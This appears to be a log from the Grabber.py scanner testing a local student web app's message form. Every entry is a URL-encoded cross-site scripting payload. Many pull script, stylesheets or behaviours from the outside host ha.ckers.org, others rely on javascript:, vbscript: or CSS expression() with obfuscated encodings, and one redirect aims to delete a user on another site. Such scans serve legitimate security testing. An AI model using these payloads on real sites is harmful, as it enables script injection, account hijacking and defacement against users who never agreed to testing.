# Log from Grabber.py
http://localhost/assignment2/message/add
message=%3CSTYLE%3EBODY%7B-moz-binding%3Aurl%28%22http%3A%2F%2Fha.ckers.org%2Fxssmoz.xml%23xss%22%29%7D%3C%2FSTYLE%3E
http://localhost/assignment2/message/add
message=%3COBJECT+TYPE%3D%22text%2Fx-scriptlet%22+DATA%3D%22http%3A%2F%2Fha.ckers.org%2Fscriptlet.html%22%3E%3C%2FOBJECT%3E
http://localhost/assignment2/message/add
message=%3CLINK+REL%3D%22stylesheet%22+HREF%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.css%22%3E
http://localhost/assignment2/message/add
message=%3CMETA+HTTP-EQUIV%3D%22Link%22+Content%3D%22%3Chttp%3A%2F%2Fha.ckers.org%2Fxss.css%3E%3B+REL%3Dstylesheet%22%3E
http://localhost/assignment2/message/add
message=%3CSTYLE%3E%40import%27http%3A%2F%2Fha.ckers.org%2Fxss.css%27%3B%3C%2FSTYLE%3E
http://localhost/assignment2/message/add
message=%3CEMBED+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.swf%22+AllowScriptAccess%3D%22always%22%3E%3C%2FEMBED%3E
http://localhost/assignment2/message/add
message=exp%2F%2A%3CXSS+STYLE%3D%27no%5Cxss%3Anoxss%28%22%2A%2F%2F%2A%22%29%3B+xss%3A%26%23101%3Bx%26%23x2F%3B%2AXSS%2A%2F%2F%2A%2F%2A%2Fpression%28alert%28%22XSS%22%29%29%27%3E
http://localhost/assignment2/message/add
message=%25BCscript%25BEalert%28%25A2XSS%25A2%29%25BC%2Fscript%25BE
http://localhost/assignment2/message/add
message=%3CSCRIPT+SRC%3D%2F%2Fha.ckers.org%2F.j%3E
http://localhost/assignment2/message/add
message=%3CXSS+STYLE%3D%22behavior%3A+url%28http%3A%2F%2Fha.ckers.org%2Fxss.htc%29%3B%22%3E
http://localhost/assignment2/message/add
message=%3CIMG+STYLE%3D%22xss%3Aexpr%2F%2AXSS%2A%2Fession%28alert%28%27XSS%27%29%29%22%3E
http://localhost/assignment2/message/add
message=%3CIMG+SRC%3D%22livescript%3A%5Bcode%5D%22%3E
http://localhost/assignment2/message/add
message=%3CFRAMESET%3E%3CFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FFRAMESET%3E
http://localhost/assignment2/message/add
message=%3CBR+SIZE%3D%22%26%7Balert%28%27XSS%27%29%7D%22%3E
http://localhost/assignment2/message/add
message=Redirect+302+%2Fa.jpg+http%3A%2F%2Fvictimsite.com%2Fadmin.asp%26deleteuser
http://localhost/assignment2/message/add
message=%3CA+HREF%3D%22http%3A%2F%2F0x42.0x0000066.0x7.0x93%2F%22%3EXSS%3C%2FA%3E
http://localhost/assignment2/message/add
message=%3CIMG+SRC%3D%22http%3A%2F%2Fwww.thesiteyouareon.com%2Fsomecommand.php%3Fsomevariables%3Dmaliciouscode%22%3E
http://localhost/assignment2/message/add
message=%3CDIV+STYLE%3D%22width%3A+expression%28alert%28%27XSS%27%29%29%3B%22%3E
http://localhost/assignment2/message/add
message=%3CIMG+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E
http://localhost/assignment2/message/add
message=%3CA+HREF%3D%22javascript%3Adocument.location%3D%27http%3A%2F%2Fwww.google.com%2F%27%22%3EXSS%3C%2FA%3E
http://localhost/assignment2/message/add
message=%3CBASE+HREF%3D%22javascript%3Aalert%28%27XSS%27%29%3B%2F%2F%22%3E
http://localhost/assignment2/message/add
message=%3CIMG+SRC%3D%27vbscript%3Amsgbox%28%22XSS%22%29%27%3E
http://localhost/assignment2/message/add
message=%3CIMG+SRC%3DJaVaScRiPt%3Aalert%28%27XSS%27%29%3E
http://localhost/assignment2/message/add
message=%3CIMG+SRC%3D%26%230000106%26%230000097%26%230000118%26%230000097%26%230000115%26%230000099%26%230000114%26%230000105%26%230000112%26%230000116%26%230000058%26%230000097%26%230000108%26%230000101%26%230000114%26%230000116%26%230000040%26%230000039%26%230000088%26%230000083%26%230000083%26%230000039%26%230000041%3E
http://localhost/assignment2/message/add
message=%3C%3F+echo%28%27%3CSCR%29%27%3B+echo%28%27IPT%3Ealert%28%22XSS%22%29%3C%2FSCRIPT%3E%27%29%3B+%3F%3E
http://localhost/assignment2/message/add
message=%3CA+HREF%3D%22http%3A%2F%2F66.102.7.147%2F%22%3EXSS%3C%2FA%3E
http://localhost/assignment2/message/add
message=%3CIFRAME+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fscriptlet.html+%3C
http://localhost/assignment2/message/add
message=%3CHTML%3E%3CBODY%3E+%3C%3Fxml%3Anamespace+prefix%3D%22t%22+ns%3D%22urn%3Aschemas-microsoft-com%3Atime%22%3E+%3C%3Fimport+namespace%3D%22t%22+implementation%3D%22%23default%23time2%22%3E+%3Ct%3Aset+attributeName%3D%22innerHTML%22+to%3D%22XSS%3CSCRIPT+DEFER%3Ealert%28%27XSS%27%29%3C%2FSCRIPT%3E%22%3E+%3C%2FBODY%3E%3C%2FHTML%3E
http://localhost/assignment2/message/add
message=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3Burl%3Djavascript%3Aalert%28%27XSS%27%29%3B%22%3E
http://localhost/assignment2/message/add
message=%3C+%253C+%26lt+%26lt%3B+%26LT+%26LT%3B+%26%2360+%26%23060+%26%230060+%26%2300060+%26%23000060+%26%230000060+%26%2360%3B+%26%23060%3B+%26%230060%3B+%26%2300060%3B+%26%23000060%3B+%26%230000060%3B+%26%23x3c+%26%23x03c+%26%23x003c+%26%23x0003c+%26%23x00003c+%26%23x000003c+%26%23x3c%3B+%26%23x03c%3B+%26%23x003c%3B+%26%23x0003c%3B+%26%23x00003c%3B+%26%23x000003c%3B+%26%23X3c+%26%23X03c+%26%23X003c+%26%23X0003c+%26%23X00003c+%26%23X000003c+%26%23X3c%3B+%26%23X03c%3B+%26%23X003c%3B+%26%23X0003c%3B+%26%23X00003c%3B+%26%23X000003c%3B+%26%23x3C+%26%23x03C+%26%23x003C+%26%23x0003C+%26%23x00003C+%26%23x000003C+%26%23x3C%3B+%26%23x03C%3B+%26%23x003C%3B+%26%23x0003C%3B+%26%23x00003C%3B+%26%23x000003C%3B+%26%23X3C+%26%23X03C+%26%23X003C+%26%23X0003C+%26%23X00003C+%26%23X000003C+%26%23X3C%3B+%26%23X03C%3B+%26%23X003C%3B+%26%23X0003C%3B+%26%23X00003C%3B+%26%23X000003C%3B+%5Cx3c+%5Cx3C+%5Cu003c+%5Cu003C
http://localhost/assignment2/message/add
message=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3B+URL%3Dhttp%3A%2F%2F%3BURL%3Djavascript%3Aalert%28%27XSS%27%29%3B%22%3E
http://localhost/assignment2/message/add
message=%3CBGSOUND+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E
http://localhost/assignment2/message/add
message=%3CIMG+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%22
http://localhost/assignment2/message/add
message=%3CXML+ID%3DI%3E%3CX%3E%3CC%3E%3C%21%5BCDATA%5B%3CIMG+SRC%3D%22javas%5D%5D%3E%3C%21%5BCDATA%5Bcript%3Aalert%28%27XSS%27%29%3B%22%3E%5D%5D%3E+%3C%2FC%3E%3C%2FX%3E%3C%2Fxml%3E%3CSPAN+DATASRC%3D%23I+DATAFLD%3DC+DATAFORMATAS%3DHTML%3E
http://localhost/assignment2/message/add
message=%3CA+HREF%3D%22h+tt+p%3A%2F%2F6%26%2309%3B6.000146.0x7.147%2F%22%3EXSS%3C%2FA%3E
http://localhost/assignment2/message/add
message=%3CIMG+SRC%3D%26%23x6A%26%23x61%26%23x76%26%23x61%26%23x73%26%23x63%26%23x72%26%23x69%26%23x70%26%23x74%26%23x3A%26%23x61%26%23x6C%26%23x65%26%23x72%26%23x74%26%23x28%26%23x27%26%23x58%26%23x53%26%23x53%26%23x27%26%23x29%3E
http://localhost/assignment2/message/add
message=%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E%3D%26%7B%7D
http://localhost/assignment2/message/add
message=%3CSCRIPT%3Edocument.write%28%22%3CSCRI%22%29%3B%3C%2FSCRIPT%3EPT+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E
http://localhost/assignment2/message/add
message=%3C%2FTITLE%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%3C%2FSCRIPT%3E
http://localhost/assignment2/message/add
message=%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E
http://localhost/assignment2/message/add
message=%3CA+HREF%3D%22%2F%2Fwww.google.com%2F%22%3EXSS%3C%2FA%3E
http://localhost/assignment2/message/add
message=%3CSCRIPT+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.jpg%22%3E%3C%2FSCRIPT%3E
http://localhost/assignment2/message/add
message=%3CINPUT+TYPE%3D%22IMAGE%22+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E
http://localhost/assignment2/message/add
message=%3CIMG+SRC%3Djavascript%3Aalert%28%27XSS%27%29%3E
http://localhost/assignment2/message/add
message=%3CBODY+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E
http://localhost/assignment2/message/add
message=%3CXML+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxsstest.xml%22+ID%3DI%3E%3C%2FXML%3E+%3CSPAN+DATASRC%3D%23I+DATAFLD%3DC+DATAFORMATAS%3DHTML%3E%3C%2FSPAN%3E
http://localhost/assignment2/message/add
message=%3CIMG+SRC%3D%22jav%26%23x09%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E
http://localhost/assignment2/message/add
message=%3CIMG+SRC%3D%22jav%26%23x0A%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E
http://localhost/assignment2/message/add
message=%3COBJECT+classid%3Dclsid%3Aae24fdae-03c6-11d1-8b76-0080c744f389%3E%3Cparam+name%3Durl+value%3Djavascript%3Aalert%28%27XSS%27%29%3E%3C%2FOBJECT%3E
http://localhost/assignment2/message/add
message=a%3D%22get%22%3B%26%2310%3Bb%3D%22URL%28%22%22%3B%26%2310%3Bc%3D%22javascript%3A%22%3B%26%2310%3Bd%3D%22alert%28%27XSS%27%29%3B%22%29%22%3B+eval%28a%2Bb%2Bc%2Bd%29%3B
http://localhost/assignment2/message/add
message=%3CHTML+xmlns%3Axss%3E+%3C%3Fimport+namespace%3D%22xss%22+implementation%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.htc%22%3E+%3Cxss%3Axss%3EXSS%3C%2Fxss%3Axss%3E+%3C%2FHTML%3E
